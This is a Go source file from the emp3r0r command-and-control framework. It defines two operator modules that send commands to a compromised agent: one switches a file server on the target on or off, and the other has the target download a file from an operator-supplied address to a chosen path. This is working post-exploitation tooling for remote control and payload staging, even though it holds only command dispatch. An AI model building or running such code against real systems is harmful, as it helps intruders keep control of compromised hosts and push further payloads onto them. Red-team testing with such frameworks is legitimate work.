package modules

import (
	"fmt"

	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleFileServer(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("No active agent")
		return
	}
	switchOpt, ok := ctx.Flags["switch"]
	if !ok {
		logging.Errorf("Option 'switch' not found")
		return
	}
	server_switch := switchOpt

	portOpt, ok := ctx.Flags["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", def.C2CmdFileServer, portOpt, server_switch)
	err := CmdSender(cmd, "", ctx.Target.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Infof("File server (port %s) is now %s", portOpt, server_switch)
}

func moduleDownloader(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("No active agent")
		return
	}
	requiredOptions := []string{"download_addr", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := ctx.Flags[opt]; !ok {
			logging.Errorf("Option '%s' not found", opt)
			return
		}
	}

	download_addr := ctx.Flags["download_addr"]
	checksum := ctx.Flags["checksum"]
	path := ctx.Flags["path"]

	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", def.C2CmdFileDownloader, download_addr, checksum, path)
	err := CmdSender(cmd, "", ctx.Target.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
